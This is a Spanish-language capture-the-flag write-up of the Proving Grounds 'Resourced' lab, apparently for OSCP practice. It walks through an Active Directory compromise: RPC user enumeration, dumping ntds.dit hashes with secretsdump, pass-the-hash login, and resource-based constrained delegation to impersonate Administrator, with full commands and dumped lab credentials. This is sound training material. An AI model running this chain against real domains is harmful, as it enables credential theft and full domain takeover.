---
layout: single
title: PG Practice (OSCP Prep.) - Resourced Writeup
excerpt: "Una parte fundamental del OSCP es el Directorio Activo. En esta ocasión, estaremos trabajando con la máquina Resourced de Proving Grounds Practice, en la cual tendremos que realizar enumeración de usuarios vía RPC, enumeración de secretos vía SMB, enumeración con BloodHound para descubrir privilegios, y el uso de archivos .ccache para conectarnos a la máquina víctima."
date: 2025-04-11
classes: wide
header:
  teaser: /assets/images/pg-writeup-resourced/pg_writeup_resourced.webp
  teaser_home_page: true
  icon: /assets/images/windows_logo.webp
categories:
  - Proving Grounds Practice
  - OSCP
tags:
  - Directorio Activo
  - Bloodhound
  - Pentesting
---

Empezamos con la máquina. 

<p align="center">
<img src="/assets/images/pg-writeup-resourced/hacker.gif">
</p>

# Enumeración 

```bash
nmap -p- -sS -sCV --min-rate 5000 --open -v -n -Pn 192.168.182.175 -oG allports
```

# Puertos: 

```bash
Nmap scan report for 192.168.182.175
Host is up (0.042s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-25 12:46:10Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=ResourceDC.resourced.local
| Not valid before: 2025-02-24T12:42:16
|_Not valid after:  2025-08-26T12:42:16
| rdp-ntlm-info: 
|   Target_Name: resourced
|   NetBIOS_Domain_Name: resourced
|   NetBIOS_Computer_Name: RESOURCEDC
|   DNS_Domain_Name: resourced.local
|   DNS_Computer_Name: ResourceDC.resourced.local
|   DNS_Tree_Name: resourced.local
|   Product_Version: 10.0.17763
|_  System_Time: 2025-02-25T12:46:59+00:00
|_ssl-date: 2025-02-25T12:47:39+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
49712/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: RESOURCEDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-02-25T12:47:01
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Feb 25 13:47:40 2025 -- 1 IP address (1 host up) scanned in 96.49 seconds
```

Algo que suelo hacer cuando enumero un directorio activo es mirar si, por el puerto `135 (RPC)`, puedo conectarme sin proporcionar contraseña y enumerar los usuarios del dominio con la query `enumdomusers`.

```bash
rpcclient -U "" 192.168.182.175 -N -c "enumdomusers" 2>/dev/null
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[M.Mason] rid:[0x44f]
user:[K.Keen] rid:[0x450]
user:[L.Livingstone] rid:[0x451]
user:[J.Johnson] rid:[0x452]
user:[V.Ventz] rid:[0x453]
user:[S.Swanson] rid:[0x454]
user:[P.Parker] rid:[0x455]
user:[R.Robinson] rid:[0x456]
user:[D.Durant] rid:[0x457]
user:[G.Goldberg] rid:[0x458]
```

Y efectivamente, puedo enumerar usuarios del dominio. 

Antes de probar un ataque [ASREPRoast](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat) con `impacket-GetNPUsers` o mirar con [Kerbrute](https://github.com/ropnop/kerbrute) qué usuarios son válidos en el dominio, suelo mirar las descripciones de los usuarios para ver si encuentro algo interesante.

Enumerar descripciones mediante RIDS(Identificadores de usuario):

```bash
$~ rpcclient -U "" 192.168.182.175 -N -c "enumdomusers" | awk 'NF{print $NF}' | cut -d ":" -f2 | tr -d "[]" > rids.txt
$~ cat rids.txt | while read rid; do rpcclient -U "" 192.168.182.175 -N -c "queryuser $rid" 2>/dev/null ; done
```

Ejecutando esto, veo algo interesante en la descripción del usuario V. Ventz, lo que parece ser una contraseña.

```bash
User Name   :	V.Ventz
	Full Name   :	
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	New-hired, reminder: HotelCalifornia194!
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	Thu, 01 Jan 1970 01:00:00 CET
	Logoff Time              :	Thu, 01 Jan 1970 01:00:00 CET
	Kickoff Time             :	Thu, 14 Sep 30828 04:48:05 CEST
	Password last set Time   :	Fri, 01 Oct 2021 13:14:52 CEST
	Password can change Time :	Sat, 02 Oct 2021 13:14:52 CEST
	Password must change Time:	Thu, 14 Sep 30828 04:48:05 CEST
	unknown_2[0..31]...
	user_rid :	0x453
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x00000000
	padding1[0..7]...
	logon_hrs[0..21]...
```

Contraseña: `HotelCalifornia194!`

La credencial es válida por `SMB`, pero no tenemos privilegios para conectarnos por `WINRM`. Ahora podría intentar aplicar un `Kerberoasting` para obtener un TGS, ahora que tengo credenciales válidas.

Probando Kerberoasting:

```bash
GetUserSPNs.py resourced.local/V.Ventz:'HotelCalifornia194!'
Impacket v0.11.0 - Copyright 2023 Fortra

No entries found!
```

No hay usuarios vulnerables en el dominio

## Enumeración SMB

```bash
smbclient -L 192.168.182.175 -U 'V.Ventz%HotelCalifornia194!'
Can't load /etc/samba/smb.conf - run testparm to debug it

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Password Audit  Disk      
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```

Veo un recurso muy interesante, Password Audit, en el cual puede haber credenciales de otros usuarios.

```bash
smbclient "//192.168.182.175/Password Audit" -U 'V.Ventz%HotelCalifornia194!'
```

Y en la carpeta registry vemos dos archivos: SECURITY y SYSTEM, los típicos archivos donde se almacena caché y credenciales en Windows.

<p align="center">
<img src="/assets/images/pg-writeup-resourced/Pasted image 20250225141453.png">
</p>


Los descargamos:

```
smb: \registry\> get SYSTEM
smb: \registry\> get SECURITY
```

Los dumpeamos: 

```bash
secretsdump.py -security security -system system LOCAL
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0x6f961da31c7ffaf16683f78e04c3e03d
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:507fdb105d9322cf53420c95780adf5f2dcdac7ca14f8b37188370c916a3fa6f2a511bb284aeac71211c939a866a2b4cc02c408e1d242ad4f5cc8f7b85d2448c18d23fb47f7b9b543a6cfb8999e40037f23dbfd8690869753979d15fe61bdcddb0ccff3d20c275207ca93e844c3b5aa1f658198225b3e54f90e0b71aaf76ba32bb1b598d189b6696c27d04674fd4c4f2c09d0df2e59fe93850aa928be813be3bd659f0d2ecba6e34fb5a3880db8155cf77e21eb44d63e1ae65abcc2aa5bdfb6bfe85e8590329929522aae501ba86d8622918e37b41daef8a2b00e78440d13e88a31fc14714923bba6fb99e13c81b3020
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x85ec8dd0e44681d9dc3ed5f0c130005786daddbd
dpapi_userkey:0x22043071c1e87a14422996eda74f2c72535d4931
[*] NL$KM 
 0000   31 BF AC 76 98 3E CF 4A  FC BD AD 0F 17 0F 49 E7   1..v.>.J......I.
 0010   DA 65 A6 F9 C7 D4 FA 92  0E 5C 60 74 E6 67 BE A7   .e.......\`t.g..
 0020   88 14 9D 4D E5 A5 3A 63  E4 88 5A AC 37 C7 1B F9   ...M..:c..Z.7...
 0030   53 9C C1 D1 6F 63 6B D1  3F 77 F4 3A 32 54 DA AC   S...ock.?w.:2T..
NL$KM:31bfac76983ecf4afcbdad0f170f49e7da65a6f9c7d4fa920e5c6074e667bea788149d4de5a53a63e4885aac37c71bf9539cc1d16f636bd13f77f43a3254daac
[*] Cleaning up...
```

Pero no encuentro nada interesante ni nada que pueda crackear mediante fuerza bruta

Seguimos enumerando `SMB`

Al seguir buscando por el recurso en el directorio `Active Directory`, veo estos dos archivos.

<p align="center">
<img src="/assets/images/pg-writeup-resourced/Pasted image 20250225141703.png">
</p>

Uno de los archivos es `ntds.dit`, donde se almacenan todas las credenciales del dominio (en forma de hashes) junto con otros datos relacionados con las cuentas de usuario y grupos. Aunque se suele decir que las credenciales están 'en memoria', en realidad están almacenadas en este archivo en el disco del controlador de dominio. Podría intentar 'dumpearlo' (extraer la información), ya que tenemos acceso también al archivo `SYSTEM`, que contiene las claves de protección necesarias para acceder al contenido del archivo `ntds.dit` y descifrar las contraseñas.

Descargamos el archivo: 

```
smb: \Active Directory\> get ntds.dit
```

Dumpeamos los hashes con `impacket-secretsdump`

```bash
secretsdump.py -ntds ntds.dit -system system LOCAL
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0x6f961da31c7ffaf16683f78e04c3e03d
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 9298735ba0d788c4fc05528650553f94
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
RESOURCEDC$:1000:aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3004b16f88664fbebfcb9ed272b0565b:::
M.Mason:1103:aad3b435b51404eeaad3b435b51404ee:3105e0f6af52aba8e11d19f27e487e45:::
K.Keen:1104:aad3b435b51404eeaad3b435b51404ee:204410cc5a7147cd52a04ddae6754b0c:::
L.Livingstone:1105:aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808:::
J.Johnson:1106:aad3b435b51404eeaad3b435b51404ee:3e028552b946cc4f282b72879f63b726:::
V.Ventz:1107:aad3b435b51404eeaad3b435b51404ee:913c144caea1c0a936fd1ccb46929d3c:::
S.Swanson:1108:aad3b435b51404eeaad3b435b51404ee:bd7c11a9021d2708eda561984f3c8939:::
P.Parker:1109:aad3b435b51404eeaad3b435b51404ee:980910b8fc2e4fe9d482123301dd19fe:::
R.Robinson:1110:aad3b435b51404eeaad3b435b51404ee:fea5a148c14cf51590456b2102b29fac:::
D.Durant:1111:aad3b435b51404eeaad3b435b51404ee:08aca8ed17a9eec9fac4acdcb4652c35:::
G.Goldberg:1112:aad3b435b51404eeaad3b435b51404ee:62e16d17c3015c47b4d513e65ca757a2:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:73410f03554a21fb0421376de7f01d5fe401b8735d4aa9d480ac1c1cdd9dc0c8
Administrator:aes128-cts-hmac-sha1-96:b4fc11e40a842fff6825e93952630ba2
Administrator:des-cbc-md5:80861f1a80f1232f
RESOURCEDC$:aes256-cts-hmac-sha1-96:b97344a63d83f985698a420055aa8ab4194e3bef27b17a8f79c25d18a308b2a4
RESOURCEDC$:aes128-cts-hmac-sha1-96:27ea2c704e75c6d786cf7e8ca90e0a6a
RESOURCEDC$:des-cbc-md5:ab089e317a161cc1
krbtgt:aes256-cts-hmac-sha1-96:12b5d40410eb374b6b839ba6b59382cfbe2f66bd2e238c18d4fb409f4a8ac7c5
krbtgt:aes128-cts-hmac-sha1-96:3165b2a56efb5730cfd34f2df472631a
krbtgt:des-cbc-md5:f1b602194f3713f8
M.Mason:aes256-cts-hmac-sha1-96:21e5d6f67736d60430facb0d2d93c8f1ab02da0a4d4fe95cf51554422606cb04
M.Mason:aes128-cts-hmac-sha1-96:99d5ca7207ce4c406c811194890785b9
M.Mason:des-cbc-md5:268501b50e0bf47c
K.Keen:aes256-cts-hmac-sha1-96:9a6230a64b4fe7ca8cfd29f46d1e4e3484240859cfacd7f67310b40b8c43eb6f
K.Keen:aes128-cts-hmac-sha1-96:e767891c7f02fdf7c1d938b7835b0115
K.Keen:des-cbc-md5:572cce13b38ce6da
L.Livingstone:aes256-cts-hmac-sha1-96:cd8a547ac158c0116575b0b5e88c10aac57b1a2d42e2ae330669a89417db9e8f
L.Livingstone:aes128-cts-hmac-sha1-96:1dec73e935e57e4f431ac9010d7ce6f6
L.Livingstone:des-cbc-md5:bf01fb23d0e6d0ab
J.Johnson:aes256-cts-hmac-sha1-96:0452f421573ac15a0f23ade5ca0d6eada06ae85f0b7eb27fe54596e887c41bd6
J.Johnson:aes128-cts-hmac-sha1-96:c438ef912271dbbfc83ea65d6f5fb087
J.Johnson:des-cbc-md5:ea01d3d69d7c57f4
V.Ventz:aes256-cts-hmac-sha1-96:4951bb2bfbb0ffad425d4de2353307aa680ae05d7b22c3574c221da2cfb6d28c
V.Ventz:aes128-cts-hmac-sha1-96:ea815fe7c1112385423668bb17d3f51d
V.Ventz:des-cbc-md5:4af77a3d1cf7c480
S.Swanson:aes256-cts-hmac-sha1-96:8a5d49e4bfdb26b6fb1186ccc80950d01d51e11d3c2cda1635a0d3321efb0085
S.Swanson:aes128-cts-hmac-sha1-96:6c5699aaa888eb4ec2bf1f4b1d25ec4a
S.Swanson:des-cbc-md5:5d37583eae1f2f34
P.Parker:aes256-cts-hmac-sha1-96:e548797e7c4249ff38f5498771f6914ae54cf54ec8c69366d353ca8aaddd97cb
P.Parker:aes128-cts-hmac-sha1-96:e71c552013df33c9e42deb6e375f6230
P.Parker:des-cbc-md5:083b37079dcd764f
R.Robinson:aes256-cts-hmac-sha1-96:90ad0b9283a3661176121b6bf2424f7e2894079edcc13121fa0292ec5d3ddb5b
R.Robinson:aes128-cts-hmac-sha1-96:2210ad6b5ae14ce898cebd7f004d0bef
R.Robinson:des-cbc-md5:7051d568dfd0852f
D.Durant:aes256-cts-hmac-sha1-96:a105c3d5cc97fdc0551ea49fdadc281b733b3033300f4b518f965d9e9857f27a
D.Durant:aes128-cts-hmac-sha1-96:8a2b701764d6fdab7ca599cb455baea3
D.Durant:des-cbc-md5:376119bfcea815f8
G.Goldberg:aes256-cts-hmac-sha1-96:0d6ac3733668c6c0a2b32a3d10561b2fe790dab2c9085a12cf74c7be5aad9a91
G.Goldberg:aes128-cts-hmac-sha1-96:00f4d3e907818ce4ebe3e790d3e59bf7
G.Goldberg:des-cbc-md5:3e20fd1a25687673
[*] Cleaning up...
```
Ahora voy a probar con `netexec` qué hashes son válidos y cuáles no.

Pegamos los `hashes` a un archivo y los `usuarios` a otro evitando usuarios y hashes repetidos

Comprobamos si son válidos con `netexec`: 

```bash
netexec smb 192.168.182.175 -u $(cat users) -H $(cat hashes) --no-bruteforce --continue-on-success
Using virtualenv: /usr/share/netexec/virtualenvs/netexec-PWU1S8Zj-py3.13
SMB         192.168.182.175 445    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:False)
SMB         192.168.182.175 445    RESOURCEDC       [-] resourced.local\Administrator:12579b1666d4ac10f0f59f300776495f STATUS_LOGON_FAILURE 
SMB         192.168.182.175 445    RESOURCEDC       [-] resourced.local\Guest:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_ACCOUNT_DISABLED 
SMB         192.168.182.175 445    RESOURCEDC       [-] resourced.local\RESOURCEDC$:9ddb6f4d9d01fedeb4bccfb09df1b39d STATUS_LOGON_FAILURE 
SMB         192.168.182.175 445    RESOURCEDC       [-] resourced.local\krbtgt:3004b16f88664fbebfcb9ed272b0565b STATUS_LOGON_FAILURE 
SMB         192.168.182.175 445    RESOURCEDC       [-] resourced.local\M.Mason:3105e0f6af52aba8e11d19f27e487e45 STATUS_PASSWORD_EXPIRED 
SMB         192.168.182.175 445    RESOURCEDC       [-] resourced.local\K.Keen:204410cc5a7147cd52a04ddae6754b0c STATUS_PASSWORD_EXPIRED 
SMB         192.168.182.175 445    RESOURCEDC       [+] resourced.local\L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808 
SMB         192.168.182.175 445    RESOURCEDC       [-] resourced.local\J.Johnson:3e028552b946cc4f282b72879f63b726 STATUS_PASSWORD_EXPIRED 
SMB         192.168.182.175 445    RESOURCEDC       [+] resourced.local\V.Ventz:913c144caea1c0a936fd1ccb46929d3c 
SMB         192.168.182.175 445    RESOURCEDC       [-] resourced.local\S.Swanson:bd7c11a9021d2708eda561984f3c8939 STATUS_PASSWORD_EXPIRED 
SMB         192.168.182.175 445    RESOURCEDC       [-] resourced.local\P.Parker:980910b8fc2e4fe9d482123301dd19fe STATUS_PASSWORD_EXPIRED 
SMB         192.168.182.175 445    RESOURCEDC       [-] resourced.local\R.Robinson:fea5a148c14cf51590456b2102b29fac STATUS_PASSWORD_EXPIRED 
SMB         192.168.182.175 445    RESOURCEDC       [-] resourced.local\D.Durant:08aca8ed17a9eec9fac4acdcb4652c35 STATUS_PASSWORD_EXPIRED 
SMB         192.168.182.175 445    RESOURCEDC       [-] resourced.local\G.Goldberg:62e16d17c3015c47b4d513e65ca757a2 STATUS_PASSWORD_EXPIRED 
```

Los que tienen un signo `+` son los válidos, por tanto, tenemos un hash válido para el usuario `L.LivingStone`.

<span style="color:green;">L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808</span>

Probemos a conectarnos con `evil-winrm`.

```bash
evil-winrm -i 192.168.182.175 -u L.Livingstone -H "19a3a7550ce8c505c2d46b5e39d6f808"
```

Y estamos dentro!

<p align="center">
<img src="/assets/images/pg-writeup-resourced/Pasted image 20250225143012.png">
</p>

Recordad que los usuarios que se pueden conectar a través del protocolo `WINRM` es porque pertenecen al grupo RemoteManagementUsers. Esto se puede comprobar si tenemos credenciales válidas con el comando `netexec winrm <IP> -u usuario -p contraseña` o `netexec winrm <IP> -u usuario -H <hash>`. Y si nos pone un símbolo `[+]` y la palabra `(Pwn3d)` es que es válido y se puede conectar.

# Escalada de privilegios

Siempre que consigo conectarme a alguna máquina del `Directorio Activo`, enumero manualmente algunas cosas. Por ejemplo, lanzo un `whoami /priv`, enumero los históricos de `PowerShell` de los usuarios a los que tengo acceso, lanzo un `winpeas.exe` para ver cosas interesantes, pero en esta ocasión no he visto nada. Por tanto, voy a optar por lanzar un `BloodHound` para ver mis privilegios dentro del dominio.

Agrega esta línea al `/etc/hosts` para que resuelva al dominio

```
192.168.182.175     resourced.local
```

Enumeración con `bloodhound-python`:

```bash
bloodhound-python -u L.Livingstone -d resourced.local -ns 192.168.182.175 -c All --hashes "aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808"
```

He encontrado este privilegio en BloodHound para el usuario `L. Livingstone`.

<p align="center">
<img src="/assets/images/pg-writeup-resourced/Pasted image 20250225154146.png">
</p>

Tener el privilegio `GenericAll` sobre `resourcedc.resourced.local` otorga al usuario un control total sobre ese objeto y puede tener implicaciones en la seguridad del entorno de `Active Directory`.


El punto es que tenemos que realizar un ataque de `Delegación Limitada` para tener acceso a la DC. Sin embargo, el problema es que no hay ningún usuario ni ordenador con el que se nos haya confiado para hacerlo, así que tenemos que crear el nuestro.

## Crear ordenador

Entonces usamos nuestro acceso con la cuenta `L.Livingstone` para crear una nueva cuenta de la máquina en el dominio. Podemos hacerlo con el uso de `impacket-addcomputer`.

```bash
addcomputer.py resourced.local/l.livingstone -dc-ip 192.168.182.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'tester$' -computer-pass 'StrongPassword123'
```
<p align="center">
<img src="/assets/images/pg-writeup-resourced/Pasted image 20250225154509.png">
</p>

Comprobamos que se creó correctamente. 

<p align="center">
<img src="/assets/images/pg-writeup-resourced/Pasted image 20250225154725.png">
</p>

Con esta cuenta agregada, ahora necesitamos un script de Python para ayudarnos a administrar los derechos de delegación. Tomemos una copia de [rbcd.py](https://github.com/fortra/impacket/blob/master/examples/rbcd.py) y usémosla para configurar [msDS-AllowedToActOnBehalfOfOtherIdentity](https://learn.microsoft.com/es-es/windows/win32/adschema/a-msds-allowedtoactonbehalfofotheridentity) en nuestra nueva cuenta de máquina.

```bash
python3 rbcd.py -dc-ip 192.168.182.175 -t RESOURCEDC -f 'tester' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced.local\\L.Livingstone
```

<p align="center">
<img src="/assets/images/pg-writeup-resourced/Pasted image 20250225155314.png">
</p>

Ahora necesitamos obtener el ticket de servicio del `administrador`. Podemos hacer esto usando `impacket-getST` con nuestra cuenta de máquina privilegiada.

```bash
getST.py -spn cifs/resourcedc.resourced.local resourced/tester\$:'StrongPassword123' -impersonate Administrator -dc-ip 192.168.182.175
```

Esto guardó el ticket en nuestro host Kali como `Administrator.ccache`. Necesitamos exportar una nueva variable de entorno llamada `KRB5CCNAME` con la ubicación de este archivo.

```bash
export KRB5CCNAME=./Administrator.ccache
```

Ahora nos podemos conectar con `psexec` con el parámetro `-k`, que hace uso de la variable que acabamos de exportar.

```bash
psexec.py -k -no-pass resourcedc.resourced.local -dc-ip 192.168.182.175
```

Ya somos el usuario `Administrador` y podemos leer la flag.

<p align="center">
<img src="/assets/images/pg-writeup-resourced/Pasted image 20250411184732.png">
</p>

Máquina completada 😎

<p align="center">
<img src="/assets/images/leonardo-dicaprio-clapping.gif">
</p>

Gracias por leer.







